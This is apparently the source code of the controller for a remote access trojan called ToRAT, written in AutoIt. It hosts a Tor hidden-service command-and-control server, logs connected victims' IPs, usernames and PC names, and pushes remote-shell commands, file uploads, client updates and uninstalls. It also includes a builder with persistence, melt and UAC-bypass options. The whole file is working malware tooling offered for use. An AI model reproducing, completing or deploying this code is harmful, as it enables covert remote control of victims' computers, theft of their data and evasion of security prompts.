#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=System\Icons\ToRAT.ico
#AutoIt3Wrapper_UseUpx=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
Global $oErrorHandler = ObjEvent("AutoIt.Error", "_ErrFunc")

#Region includes

#include <GUIConstantsEx.au3>
#include <Array.au3>
#include <WindowsConstants.au3>
#include <GuiMenu.au3>
#include <Crypt.au3>
;~ #include <GDIPlus.au3>
#include <GuiEdit.au3>
;~ #include <ButtonConstants.au3>
;~ #include <ListViewConstants.au3>
;~ #include <TabConstants.au3>
;~ #include <TreeViewConstants.au3>
#include <GuiImageList.au3>
#include <GuiListView.au3>
;~ #include <ComboConstants.au3>
;~ #include <StaticConstants.au3>
#include <Date.au3>
;~ #include <Inet.au3>
;~ #include <WinAPI.au3>
;~ #include <WinAPIShellEx.au3>
;~ #include <WinAPISys.au3>
;~ #include <File.au3>
#include <WinAPIRes.au3>
#include <ScrollBarsConstants.au3>
#include <ProgressConstants.au3>
#include <StaticConstants.au3>
#Include <GuiButton.au3>
#include <EditConstants.au3>


#include "Includes\ASock.au3"
#include "Includes\Base64.au3"
#include "Includes\LZNT.au3"
#include "Includes\OwnTab.au3"
#include "Includes\MemoryDll.au3"
#include "Includes\SQLite.au3"

#EndRegion includes

#Region operation of autoit funtion/parameters

Opt("TrayIconDebug", 1)
;~ Opt("TrayOnEventMode", 1)
;~ Opt("TrayMenuMode", 1)
Opt("GUIOnEventMode", 1)
Opt("TCPTimeout", 0)
Opt("MouseCoordMode", 2)

#EndRegion operation of autoit funtion/parameters

#region resource icon vars
Global Const $tagICONRESDIR = 'byte Width;byte Height;byte ColorCount;byte Reserved;ushort Planes;ushort BitCount;dword BytesInRes;ushort IconId;'
Global Const $tagNEWHEADER = 'ushort Reserved;ushort ResType;ushort ResCount;' ; & $tagICONRESDIR[ResCount]
#EndRegion

#Region Resources rcdata Vars
Global Const $RESOURCE_GUID = 'B18E2CDC-0C56-11E4-9E4A-30540707A45E'
Global Const $RESOURCE_BITMAP_HEADER = 14 ; DllStructGetSize(DllStructCreate($tagBITMAPFILEHEADER))
Global Const $RESOURCE_LANG_DEFAULT = 0
Global Enum $RESOURCE, $RESOURCE_FIRSTINDEX
Global Enum $RESOURCE_FILEPATH, $RESOURCE_ID, $RESOURCE_INDEX, $RESOURCE_ISNOTUPDATE, $RESOURCE_UBOUND, $RESOURCE_UPDATE, $RESOURCE_MAX
Global Enum $RESOURCE_RESISADDED, $RESOURCE_RESLANG, $RESOURCE_RESLENGTH, $RESOURCE_RESNAMEORID, $RESOURCE_RESPATH, $RESOURCE_RESTYPE
#EndRegion

#Region declares

Global $sVersion = "v0.2.1"

Global $iPacketSize = 4096 ;Maximum size to receive every check

Global $hTimerMainChecks = TimerInit()
;~ Global $bFlagCacheSockEvents = 0
Global $bFlagVerbose = 0 ;Verbose Log off

Global $bFlagFileUpload = 0
Global $bFlagServerBusy = 0
Global Enum $sCacheFileUploadSocket, $sCacheFileUploadLPath, $sCacheFileUploadRPath
Global $aCacheFileUpload[$sCacheFileUploadRPath +1]

Global $hImageFlags

Global $iTorPID = -1

Global $MY_WM_USER = 0
Enum $sListeningIP, $iListeningPort, $sListeningSocket
Global $aListeningAddress[3]
$aListeningAddress[$sListeningIP] = "127.0.0.1"
$aListeningAddress[$iListeningPort] = 1594
$aListeningAddress[$sListeningSocket] = -1

Global $sSocksAddress = "127.0.0.1"
Global $iSocksPort = 9050

Global Enum $iUploadID, $iUploadSocket, $sLocalPath, $sRemotePath, $iFileSize, $iBytesSend, $sStatus, $iLVUploadItemID
Global $aFileUpload[0][$iLVUploadItemID +1]
Global $iUploadIDCount = 1
;~ _ArrayDisplay($aFileUpload)

Global $hQueryReadConnection
Global $hQueryGetDBCount

Global $iCurrentConnections = 0
Global $iConnectionCounter = 0

Global $aRemoteShellGUI[0][50]

Global Const $sPacketLVInfo = "[PACKET_TYPE_0001]" ;sends listview infos to the CnC Server
Global Const $sPacketPing = "[PACKET_TYPE_0002]" ;Get ping over tor in ms
Global Const $sPacketSystem = "[PACKET_TYPE_0003]" ;Client restart Close etc
Global Const $sPacketUpload = "[PACKET_TYPE_0004]" ;FileUpload
Global Const $sPacketDownload = "[PACKET_TYPE_0005]" ;FileDownload
Global Const $sPacketRemoteShell = "[PACKET_TYPE_0006]" ;RemoteShell
Global Const $sPacketDivider = "[PACKET_SPLIT]" ; Defines where to split sections of a packet
Global Const $sPacketEND = "[PACKET_END]" ; Defines the end of a packet
#EndRegion declares

#Region declares to edit in setting

#EndRegion declares to edit in setting

#Region global scope

$hNtdll=DLlOpen("ntdll.dll")
DllCall("kernel32.dll", "int", "Wow64DisableWow64FsRedirection", "int", 1) ;um richtigen system32 ordner zu sehen nicht wow64

TCPStartup() ; Starts up TCP

#include "GUI\Main.au3"

$hGUINotifyASock = GUICreate("Dummy Notify ASock Window") ;dummy gui for asock events

$hImageFlags = _GUIImageList_Create()

_SQLite_Startup()
$hDBConnections = _SQLite_Open("")
_SQLite_Exec($hDBConnections, "CREATE TABLE tblConnections (SocketNo, ConnectionNo, LVItemID, RecvBuffer BLOB, SendBuffer BLOB);")

BuilderMutex() ;Fill Builder Mutex Input with Random String
StartListen()

While 1
	If TimerDiff($hTimerMainChecks) / 1000 >= 10 Then
		_ShowSqlTbl($hDBConnections, "tblConnections") ;debuging
;~ 		_ArrayDisplay($aRemoteShellGUI)
		If ProcessExists($iTorPID) Then
		Else
			_Log('[Tor] Tor not running. Trying to restart Tor')
			StopListen()
			StartListen()
		EndIf

;~ 		Local $hQuery, $aRow
;~ 		$i = 0
;~ 		_SQLite_Query($hDBConnections, "SELECT SocketNo FROM tblConnections;", $hQuery) ;get SocketNo
;~ 		While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK ; Read Out the next Row
;~ 				If $aRow[0] = -1 Then ContinueLoop
;~ 				_Send($aRow[0],$sPacketPing & "TestConnection" & $sPacketEND)
;~ 			$i += 1
;~ 		WEnd
;~ 		_SQLite_QueryFinalize($hQuery)


		$hTimerMainChecks = TimerInit()
	EndIf

	ReadConnection()

	For $i = 0 To UBound($aFileUpload) -1
		If $aFileUpload[$i][$iUploadID] <> "" Then
			FileUploading($aFileUpload[$i][$iUploadID], $aFileUpload[$i][$iUploadSocket], $aFileUpload[$i][$sLocalPath], $aFileUpload[$i][$sRemotePath], $aFileUpload[$i][$iFileSize], $aFileUpload[$i][$iBytesSend], $aFileUpload[$i][$sStatus], $aFileUpload[$i][$iLVUploadItemID])
			If $aFileUpload[$i][$sStatus] = "Completed" Then
				_Send($aFileUpload[$i][$iUploadSocket], $sPacketUpload & "" & $sPacketDivider & $aFileUpload[$i][$iUploadID] & $sPacketDivider & $aFileUpload[$i][$sRemotePath] & $sPacketDivider & $aFileUpload[$i][$iFileSize] & $sPacketDivider & $aFileUpload[$i][$iBytesSend] & $sPacketDivider & $aFileUpload[$i][$sStatus] & $sPacketEND)
				ConsoleWrite("before array delete" & @CRLF)
				_ArrayDelete($aFileUpload, $i)
				ConsoleWrite("after array delete" & @CRLF)
				ExitLoop
			EndIf
		EndIf
	Next

	If $bFlagServerBusy = 0 And $bFlagFileUpload = 1 Then
		FileUpload($aCacheFileUpload[$sCacheFileUploadSocket], $aCacheFileUpload[$sCacheFileUploadLPath], $aCacheFileUpload[$sCacheFileUploadRPath])
	EndIf

	_HighPrecisionSleep(1000,$hNtdll) ;since autoit sleep is always bigger then 10ms but we only wanna sleep 1 ms
WEnd

#EndRegion global scope

#Region Connection funtions

Func StartListen()
	StartTor()
	;start listen
	If $aListeningAddress[$sListeningSocket] = -1 Then
		$aListeningAddress[$sListeningSocket] =  _ASocket();_StartServer($ip, $port, "OnSocketEvent");TCPListen($ip,$port,$MaxConnections) ; Starts listening
		If @error Then ConsoleWrite( "Socket creation failed." & @CRLF)
		$MY_WM_USER = $WM_USER ;+ $i
		_ASockSelect($aListeningAddress[$sListeningSocket],$hGUINotifyASock , $MY_WM_USER, BitOR($FD_READ, $FD_WRITE, $FD_ACCEPT, $FD_CLOSE))
		GUIRegisterMsg($MY_WM_USER, "OnSocketEvent")
		_ASockListen($aListeningAddress[$sListeningSocket], $aListeningAddress[$sListeningIP], $aListeningAddress[$iListeningPort])
		If @error Then
			MsgBox(16,"ToRAT","Could not create Socket on "& $aListeningAddress[$sListeningIP] & " with Port "& $aListeningAddress[$iListeningPort] &". Port in use?" & @CRLF & "@error = " & @error & " @extended = " & @extended,5)
			$aListeningAddress[$sListeningSocket] = -1
		Else
			_Log("[Connection] Listening on: " & $aListeningAddress[$sListeningIP] & ":" & $aListeningAddress[$iListeningPort])
		EndIf
	EndIf
EndFunc

Func StartTor()
	While 1
		If $iTorPID = -1 Then ;check if tor still running from preview start
			If FileExists(@ScriptDir & "\System\Tor\TorData\Tor.pid") Then
				$iTorPID = StringStripWS(FileRead(@ScriptDir & "\System\Tor\TorData\Tor.pid"),8)
				ExitLoop ;tor already running
			EndIf
		Else
			If ProcessExists($iTorPID) Then ExitLoop ;tor running everything fine
			$iSocksPort += 1
		EndIf

		;Configure Tor with hidden_service
		$hFile = FileOpen(@ScriptDir & "\System\Tor\TorConfig", 10)
		FileWrite($hFile,"DataDirectory " & @ScriptDir & "\System\Tor\TorData" & @CRLF & "HiddenServiceDir " & @ScriptDir & "\System\Tor\Hidden_Service" & @CRLF & "HiddenServicePort " & $aListeningAddress[$iListeningPort] & " " & $aListeningAddress[$sListeningIP] & ":" & $aListeningAddress[$iListeningPort] & @CRLF & "SocksListenAddress " & $sSocksAddress & @CRLF & "SocksPort " & $iSocksPort & @CRLF & "PidFile " & @ScriptDir & "\System\Tor\TorData\Tor.pid" & @CRLF)
		FileClose($hFile)
		;Create HiddenPath Dir if not exists
		If FileExists(@ScriptDir & "\System\Tor\Hidden_Service") Then
		Else
			DirCreate(@ScriptDir & "\System\Tor\Hidden_Service")
		EndIf
		;Start Tor
		$iTorPID = ShellExecute(@ScriptDir & "\System\Tor\tor.exe", "-f TorConfig", @ScriptDir & "\System\Tor")
	WEnd
	$sOnion = StringStripWS(FileRead(@ScriptDir & "\System\Tor\Hidden_Service\hostname"),8)
	_Log('[Tor] Tor Hidden_Service started (' & $sOnion & ':' & $aListeningAddress[$iListeningPort] & ')' & ' SocksPort: ' & $iSocksPort & ' Tor PID: ' & $iTorPID)
EndFunc

Func StopListen()
;~ 	GUICtrlSetState($ButtonStopHiddenService, $GUI_HIDE)
;~ 	GUICtrlSetState($ButtonStartHiddenService, $GUI_SHOW)
	ProcessClose($iTorPID)
	If ProcessWaitClose($iTorPID, 5) Then
		_Log('[Tor] Tor Hidden_Service stopped')
		Sleep(100) ;give windows time to remove all the handles to that dir before we can delete it
		DirRemove(@ScriptDir & "\System\Tor\TorData",1) ;generated from tor.exe
	Else
		_Log('[Tor] Tor Hidden_Service could not be stopped')
	EndIf

	For $i = 0 To 0 ;change to wieviele adressen eingetragen wurden
		TCPCloseSocket($aListeningAddress[$sListeningSocket])
		$aListeningAddress[$sListeningSocket] = -1
	Next
EndFunc

Func OnSocketEvent( $hWnd, $iMsgID, $WParam, $LParam )
    Local $hSocket = $WParam; Get the socket involved (either $hListen or $hAccepted in this example)
	Local $nSocket = $iMsgID - $WM_USER
    Local $iError = _HiWord( $LParam ); If error is 0 then the event indicates about a success
    Local $iEvent = _LoWord( $LParam ); The event: incoming conn / data received / perfect conditions to send / conn closed

    If $iMsgID >= $WM_USER And $iMsgID < $MY_WM_USER +1 Then; Winsock, not Windows GDI
        Switch $iEvent
			Case $FD_ACCEPT; Incoming connection!
				ConsoleWrite("fd accept" & @CRLF)
                If $iError <> 0 Then
                    ConsoleWrite( $nSocket & " Error accepting on socket #" & $nSocket & "... :(" & @CRLF)
                EndIf
				AcceptConnection($hSocket)
            Case $FD_READ; Data has arrived!
                If $iError <> 0 Then
                    ConsoleWrite( $nSocket & " FD_READ was received with the error value of " & $iError & "." & @CRLF)
                Else
;~ 					ConsoleWrite( $nSocket & " FD_READ " & @CRLF)
                EndIf
            Case $FD_WRITE ;ready to send stuff
                If $iError <> 0 Then
                    ConsoleWrite( $nSocket & " FD_WRITE was received with the error value of " & $iError & "." & @CRLF)
				Else
;~ 					ConsoleWrite( $nSocket & " FD_WRITE " & @CRLF)
                EndIf
            Case $FD_CLOSE; Bye bye
;~ 				ConsoleWrite( "Connection was closed on socket number: " & $iSocket & "." & @CRLF)
				$iSocket = Dec(StringTrimLeft($hSocket,2))
				CloseConnection($iSocket)
        EndSwitch
    EndIf
EndFunc

Func AcceptConnection($hSocket)
	$iTempSocket = TCPAccept($hSocket)
	If $iTempSocket = -1 Then ; If we found no new connections
		ConsoleWrite( "Error accepting connection" & @CRLF)
		Return
	EndIf
	_Log('[Connection] New incoming connection from Socket ' & $iTempSocket)

	; Save the socket number, connection count number and LVItemID in the DB table tblConnections
	$iLVItemIndex = _GUICtrlListView_AddItem($idLVConnections,"")
	$iLVItemID = _GUICtrlListView_MapIndexToID($idLVConnections, $iLVItemIndex)
	_GUICtrlListView_AddSubItem($idLVConnections, $iLVItemIndex, _Now(), 10)
	_GUICtrlListView_SetItem($idLVConnections, $iTempSocket, $iLVItemIndex , 11)

	$Result = _SQLite_Exec($hDBConnections, "Insert into tblConnections values (" & $iTempSocket & "," & $iConnectionCounter & "," & $iLVItemID & "," & "Null, Null" & ");") ; LVitem ID
	If $Result = $SQLITE_OK Then
		$iConnectionCounter += 1 ;counts all connections that were established
		$iCurrentConnections = _GUICtrlListView_GetItemCount($idLVConnections) ;counts only current established connections

		GUICtrlSetData($aCtrlTab[1][0], "     " & $iCurrentConnections & " Connections") ;make space in case we got over 999 connections. so we can still read the whole text "connections"
	EndIf
EndFunc

Func CloseConnection($iSocket)
	$iLVItemIndex = _GetLVItemIndex($iSocket)
	$Result = _SQLite_Exec($hDBConnections, "DELETE FROM tblConnections WHERE SocketNo = " & $iSocket & ";") ;delete row in DB
	If $Result = $SQLITE_OK Then
		_ASockShutdown($iSocket); Graceful shutdown.
		_GUICtrlListView_DeleteItem($idLVConnections, $iLVItemIndex)
		$iCurrentConnections = _GUICtrlListView_GetItemCount($idLVConnections) ;counts only current established connections
		GUICtrlSetData($aCtrlTab[1][0], "     " & $iCurrentConnections & " Connections")
		_Log('[Connection] Connection closed on Socket ' & $iSocket)
	EndIf
EndFunc

Func ReadConnection()
	Local $aRow
	Local $sRecvBuffer = ""
	_SQLite_Query($hDBConnections, "SELECT SocketNo FROM tblConnections;", $hQueryReadConnection);get SocketNo
	While _SQLite_FetchData($hQueryReadConnection, $aRow, False, False) = $SQLITE_OK ; Read Out the next Row
		$sRecvData = TCPRecv($aRow[0], $iPacketSize)
		If @error Then
			$iError = @error
			If $iError <> 10035 Then
				CloseConnection($aRow[0])
				ContinueLoop
			Else
				ConsoleWrite("Recv Error: " & $iError & @CRLF)
			EndIf
		EndIf

		If $sRecvData <> "" Then ; If we got data
			$sRecvBuffer = _WriteBuffer($sRecvData, $aRow[0])
		EndIf

		If StringInStr($sRecvBuffer, "[PACKET_TYPE_") And Not StringInStr($sRecvBuffer, $sPacketEND) Then
			Local $hTimerLoop = TimerInit() ;Timer to exit loop so the userinputs dont get "blocked" or gui seems "freezed"
			Do
				$sRecvData = TCPRecv($aRow[0], $iPacketSize)
				If @error Then
					$iError = @error
					If $iError <> 10035 Then
						CloseConnection($aRow[0])
						ContinueLoop(2)
					Else
						ConsoleWrite("Recv Error: " & $iError & @CRLF)
					EndIf
				EndIf

				If $sRecvData <> "" Then ; If we got data
					$sRecvBuffer = _WriteBuffer($sRecvData, $aRow[0])
				EndIf

			Until $sRecvData = "" Or TimerDiff($hTimerLoop) >= 500 ;Timer to exit loop so the userinputs dont get "blocked" or gui seems "freezed"
		EndIf

		While StringInStr($sRecvBuffer, $sPacketEND)
			Local $sRawPackets = $sRecvBuffer ; Transfer all the data we have to a new variable.
			Local $sFirstPacketLength = StringInStr($sRawPackets, $sPacketEND) - 30 ; Get the length of the packet, and subtract the length of the prefix/suffix.
			Local $sPacketType = StringLeft($sRawPackets, 18) ; Copy the first 18 characters, since that is where the packet type is put.
			Local $sCompletePacket = StringMid($sRawPackets, 19, $sFirstPacketLength + 11) ; Extract the packet.
			Local $sPacketsLeftover = StringTrimLeft($sRawPackets, $sFirstPacketLength + 41) ; Trim what we are using, so we only have what is left over. (any incomplete packets)
			$sRecvBuffer = _ClearAndWriteBuffer($sPacketsLeftover, $aRow[0])  ; Transfer any leftover packets back to the buffer.
			; Writes some stuff to the console for debugging.
			ConsoleWrite(">> Raw Data Size: " & StringLen($sRawPackets) & @CRLF)
;~ 				ConsoleWrite(">> Raw Data2: " & $sRawPackets & @CRLF)
			ConsoleWrite(">> Full packet found! Size: " & StringLen($sCompletePacket) & @CRLF)
			ConsoleWrite("+> Type: " & $sPacketType & @CRLF)
			If StringLen($sCompletePacket) <= 70 Then
				ConsoleWrite("+> Packet: " & $sCompletePacket & @CRLF)
			Else
				ConsoleWrite("+> Packet: " & StringLeft($sCompletePacket, 80) & "[...]" & @CRLF)
			EndIf
			If StringLen($sRecvBuffer) <= 70 Then
				ConsoleWrite("!> Left in buffer: " & $sRecvBuffer & @CRLF & @CRLF)
			Else
				ConsoleWrite("!> Left in buffer: " & StringLeft($sRecvBuffer, 80) & "[...]" & @CRLF & @CRLF)
			EndIf
			; Since we extracted a packet, we will send it to the processor.
			ProcessFullPacket($sCompletePacket, $sPacketType, $aRow[0])
		WEnd
	WEnd
	_SQLite_QueryFinalize($hQueryReadConnection)
EndFunc

Func ProcessFullPacket($sCompletePacket,$sPacketType, $iSocket)
	Switch $sPacketType
		Case $sPacketLVInfo
			RefreshLVInfo($sCompletePacket, $iSocket)
		Case $sPacketPing
			PingPong($sCompletePacket, $iSocket)
		Case $sPacketRemoteShell
			RemoteShellRCV($sCompletePacket, $iSocket)
	EndSwitch
EndFunc

Func RefreshLVInfo($sCompletePacket, $iSocket)
	$aCompletePacket = StringSplit($sCompletePacket,$sPacketDivider,1)
	$aLVData = StringSplit($aCompletePacket[1],"|",1)
	$sLVDataOSLang = _LCIDToLocaleName("0x" & $aLVData[1])
	$sLVDataIdleTime = _Sec2Time($aLVData[8] / 1000)
	$iLVItemIndex = _GetLVItemIndex($iSocket)
	$iDBCount = _GetDBCount()
	$iLVItemCount = _GUICtrlListView_GetItemCount($idLVConnections)
	If $iLVItemCount < $iDBCount Then ;if listviewitem got deleted accidently recreate it and write new LVItemID to sql db
		ConsoleWrite("!> Recreating LVItem" & @CRLF)
		$iLVItemIndex = _GUICtrlListView_AddItem($idLVConnections,"")
		$iLVItemID = _GUICtrlListView_MapIndexToID($idLVConnections, $iLVItemIndex)
		_GUICtrlListView_AddSubItem($idLVConnections, $iLVItemIndex, _Now(), 10)
		_GUICtrlListView_SetItem($idLVConnections, $iSocket, $iLVItemIndex , 11)
		$Result = _SQLite_Exec($hDBConnections, "UPDATE tblConnections SET LVItemID=" & $iLVItemID & " WHERE SocketNo=" & $iSocket & ";") ;Update LVItemID on iSocket
		If $Result = $SQLITE_OK Then
			$iCurrentConnections = _GUICtrlListView_GetItemCount($idLVConnections) ;counts only current established connections
			GUICtrlSetData($aCtrlTab[1][0], "     " & $iCurrentConnections & " Connections")
		EndIf
		_Send($iSocket,$sPacketLVInfo & "GetLVInfos" & $sPacketEND) ;get all LVInfos again
	EndIf

	If $aCompletePacket[2] = "True" Then
		$sCountryCode = _IpToCountry($aLVData[3])
		_SetFlag($sCountryCode, $iLVItemIndex)
		;Country|OS Language|WAN IP|LAN IP|PC Name|Username|Operating System|Idle Time|Ping|Client ID|Time Connected|Socket;
		_GUICtrlListView_SetItem($idLVConnections, $sCountryCode, $iLVItemIndex, 0)
		_GUICtrlListView_SetItem($idLVConnections, $sLVDataOSLang, $iLVItemIndex, 1)
		_GUICtrlListView_SetItem($idLVConnections, $aLVData[3], $iLVItemIndex, 2)
		_GUICtrlListView_SetItem($idLVConnections, $aLVData[4], $iLVItemIndex, 3)
		_GUICtrlListView_SetItem($idLVConnections, $aLVData[5], $iLVItemIndex, 4)
		_GUICtrlListView_SetItem($idLVConnections, $aLVData[6], $iLVItemIndex, 5)
		_GUICtrlListView_SetItem($idLVConnections, $aLVData[7], $iLVItemIndex, 6)
		_GUICtrlListView_SetItem($idLVConnections, $sLVDataIdleTime, $iLVItemIndex, 7)
		_GUICtrlListView_SetItem($idLVConnections, $aLVData[9], $iLVItemIndex, 8)
		_GUICtrlListView_SetItem($idLVConnections, $aLVData[10], $iLVItemIndex, 9)

		_Log('[Client] New Client Connected. WAN IP: ' & $aLVData[3] & ' PC Name: ' & $aLVData[5] & ' from Socket ' & $iSocket)
	Else
		;Country|OS Language|WAN IP|LAN IP|PC Name|Username|Operating System|Idle Time|Ping|Client ID|Time Connected|Socket;
		If $aLVData[8] <> "" Then
			_GUICtrlListView_SetItem($idLVConnections, $sLVDataIdleTime, $iLVItemIndex, 7)
		EndIf
		If $aLVData[9] <> "" Then
			_GUICtrlListView_SetItem($idLVConnections, $aLVData[9], $iLVItemIndex, 8)
		EndIf
	EndIf
EndFunc

Func PingPong($sCompletePacket, $iSocket)
	If $sCompletePacket = "Ping" Then
		_Send($iSocket, $sPacketPing & "Pong" & $sPacketEND)
	EndIf
EndFunc

#EndRegion Connection functions

#Region FileTransfere functions

Func FileUpload($iSocket, $sLocalPath, $sRemotePath)
	If $bFlagServerBusy = 0 Then ;we set this flag to not redim array in FileUpload function while we are working with it
		ReDim $aFileUpload[Ubound($aFileUpload) +1][8] ;we got new file upload - redim array
		;write data to last row
		$aFileUpload[Ubound($aFileUpload) -1][0] = $iUploadIDCount
		$aFileUpload[Ubound($aFileUpload) -1][1] = $iSocket
		$aFileUpload[Ubound($aFileUpload) -1][2] = $sLocalPath
		$aFileUpload[Ubound($aFileUpload) -1][3] = $sRemotePath
		$aFileUpload[Ubound($aFileUpload) -1][6] = "Start"
;~ 	 	$aFileUpload[Ubound($aFileUpload) -1][7] = 1 ;LVUploadID for later use in filemanager or download manager

		;increase the id counter so we never get same id
		$iUploadIDCount += 1
		$bFlagFileUpload = 0
	Else
;~ 		MsgBox(0,"ToRAT","Sorry that was just the wrong timing. Please try again", 5) ;TO DO - remember socket lpath rpath and set a flag and try automatically again from main loop
		ConsoleWrite("!>SAVED FILEUPLOAD****************************+++++++++++++++++++++++++++++++++++++++++++++" & @CRLF)
		$bFlagFileUpload = 1 ; we set this flag to try the fileupload again from main loop
		$aCacheFileUpload[$sCacheFileUploadSocket] = $iSocket
		$aCacheFileUpload[$sCacheFileUploadLPath] = $sLocalPath
		$aCacheFileUpload[$sCacheFileUploadRPath] = $sRemotePath
	EndIf
EndFunc

Func FileUploading($iUploadID, $iUploadSocket, $sLocalPath, $sRemotePath, ByRef $iFileSize, ByRef $iBytesSend, ByRef $sStatus, $iLVUploadItemID)
	$bFlagServerBusy = 1 ;we set this flag to not redim array in FileUpload function while we are working with it
	$iFileSize = FileGetSize($sLocalPath)
	$hLocalFile = FileOpen($sLocalPath, 16)
	FileSetPos($hLocalFile, $iBytesSend, 0)
	$dBytesRead = FileRead($hLocalFile, 4096)
	FileClose($hLocalFile)

	If StringLen($dBytesRead) > 1 Then ;This check must be added because _Base64Encode/Decode() will crash the script if it gets empty input.
		$dB64BytesRead = _Base64Encode($dBytesRead)
		;lzntcompress einfügen

		_Send($iUploadSocket, $sPacketUpload & $dB64BytesRead & $sPacketDivider & $iUploadID & $sPacketDivider & $sRemotePath & $sPacketDivider & $iFileSize & $sPacketDivider & $iBytesSend & $sPacketDivider & $sStatus & $sPacketEND)
		If @error Then
			If @extended = 2 Then
				$sStatus = "Completed" ;abort file transfere maybe client lost connection
			EndIf
		Else
			$sStatus = "Running"
			$iBytesSend = $iBytesSend + BinaryLen($dBytesRead)
		EndIf
		If $iFileSize = $iBytesSend Then
			$sStatus = "Completed"
		EndIf
		ConsoleWrite(">File Upload. ID: " & $iUploadID & " Socket: " & $iUploadSocket & " LPath: " & $sLocalPath & " RPath: " & $sRemotePath & " FSize: " & $iFileSize & " BSend: " & $iBytesSend & " Status: " & $sStatus & " LVID: " & $iLVUploadItemID & @CRLF)
	EndIf
	$bFlagServerBusy = 0
EndFunc

#EndRegion FileTransfere functions

#Region Contextmenu functions

Func UpdateClient()
	Local $aSelected
    $aSelected = _GUICtrlListView_GetSelectedIndices($idLVConnections, True)
    If $aSelected[0] > 0 Then
			For $i = 1 To $aSelected[0]
				$iSocket = _GetSocketNoFromLVItemIndex($aSelected[$i])
				FileUpload($iSocket, FileOpenDialog("Select new Client.exe",@ScriptDir & "\","NewClient (*.exe)"), "@ScriptDir\Update.exe")
				$sPCName = _GUICtrlListView_GetItemText($idLVConnections, $aSelected[$i], 4)
				_Log('[Client] Client "' & $sPCName & '" updateing on Socket ' & $iSocket)
			Next
;~ 		EndIf
	Else
		MsgBox(0,"","No Client selected",5)
    EndIf
EndFunc

Func RestartClient()
	Local $aSelected
    $aSelected = _GUICtrlListView_GetSelectedIndices($idLVConnections, True)
    If $aSelected[0] > 0 Then
		$iCloseAnswere = MsgBox(4,"Restart Client", "Are you sure to restart the Client? He will be available in the next few seconds.", 5)
		If $iCloseAnswere = 6 Then
			For $i = 1 To $aSelected[0]
				$sPCName = _GUICtrlListView_GetItemText($idLVConnections, $aSelected[$i], 4)
				$iSocket = _GetSocketNoFromLVItemIndex($aSelected[$i])
				_Send($iSocket, $sPacketSystem & "CLIENT_RESTART" & $sPacketEND)
				_Log('[Client] Client "' & $sPCName & '" restarting on Socket ' & $iSocket)
			Next
		EndIf
	Else
		MsgBox(0,"","No Client selected",5)
    EndIf
EndFunc

Func CloseClient()
	Local $aSelected
    $aSelected = _GUICtrlListView_GetSelectedIndices($idLVConnections, True)
    If $aSelected[0] > 0 Then
		$iCloseAnswere = MsgBox(4,"Close Client", "Are you sure to close the Client? He will be available on next system boot.", 5)
		If $iCloseAnswere = 6 Then
			For $i = 1 To $aSelected[0]
				$sPCName = _GUICtrlListView_GetItemText($idLVConnections, $aSelected[$i], 4)
				$iSocket = _GetSocketNoFromLVItemIndex($aSelected[$i])
				_Send($iSocket, $sPacketSystem & "CLIENT_CLOSE" & $sPacketEND)
				_Log('[Client] Client "' & $sPCName & '" closeing on Socket ' & $iSocket)
			Next
		EndIf
	Else
		MsgBox(0,"","No Client selected",5)
    EndIf
EndFunc

Func UninstallClient()
	Local $aSelected
    $aSelected = _GUICtrlListView_GetSelectedIndices($idLVConnections, True)
    If $aSelected[0] > 0 Then
		$iCloseAnswere = MsgBox(4,"Uninstall Client", "Are you sure to uninstall the Client?", 5)
		If $iCloseAnswere = 6 Then
			For $i = 1 To $aSelected[0]
				$sPCName = _GUICtrlListView_GetItemText($idLVConnections, $aSelected[$i], 4)
				$iSocket = _GetSocketNoFromLVItemIndex($aSelected[$i])
				_Send($iSocket, $sPacketSystem & "CLIENT_UNINSTALL" & $sPacketEND)
				_Log('[Client] Client "' & $sPCName & '" uninstalling on Socket ' & $iSocket)
			Next
		EndIf
	Else
		MsgBox(0,"","No Client selected",5)
    EndIf
EndFunc



#EndRegion Contextmenu functions

#Region gui functions Builder

Func BuilderIcon()
	$sClientIcon = FileOpenDialog("Select an icon", @ScriptDir & "\System\ClientIcons", "Icons (*.ico)", $FD_FILEMUSTEXIST)
	If $sClientIcon = "" Then
		Return
	EndIf

	If GUICtrlSetImage($idIconClientIcon, $sClientIcon) Then
		GUICtrlSetData($idInputIcon, $sClientIcon)
	Else
		MsgBox(0,"Client Icon","Path not valid or not an Icon.", 5)
		GUICtrlSetData($idInputIcon, GUICtrlRead($idInputIcon))
		GUICtrlSetImage($idIconClientIcon, GUICtrlRead($idInputIcon))
	EndIf
	GUICtrlSetState($idCheckboxUseIcon, $GUI_CHECKED)
EndFunc

Func BuilderMutex()
	Local $sRandom = ""
    For $i = 1 To Random(16, 32, 1) ; Return an integer between 5 and 20 to determine the length of the string.
        $Chr = Chr(Random(65, 122, 1)) ; Return an integer between 65 and 122 which represent the ASCII characters between a (lower-case) to Z (upper-case).
		If $Chr = Chr(92) Then ContinueLoop ;wenn chr \ dann verwerfen. \ bei singleton für namespace
		$sRandom = $sRandom & $Chr
    Next
	GUICtrlSetData($idInputMutex, $sRandom)
EndFunc

Func BuilderAddConnection()
	$ip = GUICtrlRead($idInputOnion)
	$port = GUICtrlRead($idInputPort)
	GUICtrlCreateListViewItem($ip & "|" & $port, $idListviewOnion)
EndFunc

Func BuilderRemoveConnection()
	_GUICtrlListView_DeleteItemsSelected($idListviewOnion)
EndFunc

Func BuilderInstallClient()
	If GUICtrlRead($idCheckboxInstallClient) = $GUI_UNCHECKED Then
		GUICtrlSetState($idGroupInstallLocation, $GUI_DISABLE)
		GUICtrlSetState($idRadioAppData, $GUI_DISABLE)
		GUICtrlSetState($idRadioLocalAppData, $GUI_DISABLE)
		GUICtrlSetState($idRadioTemp, $GUI_DISABLE)
		GUICtrlSetState($idRadioCustomPath, $GUI_DISABLE)
		GUICtrlSetState($idInputCustomPath, $GUI_DISABLE)
		GUICtrlSetState($idLabelFolder, $GUI_DISABLE)
		GUICtrlSetState($idLabelFileName, $GUI_DISABLE)
		GUICtrlSetState($idInputFolder, $GUI_DISABLE)
		GUICtrlSetState($idInputFileName, $GUI_DISABLE)

		GUICtrlSetState($idGroupInstallOptions, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxPersistence, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxMelt, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxRemoveIcon, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxBypassUAC, $GUI_DISABLE)
		GUICtrlSetState($idCheckboxDelay, $GUI_DISABLE)
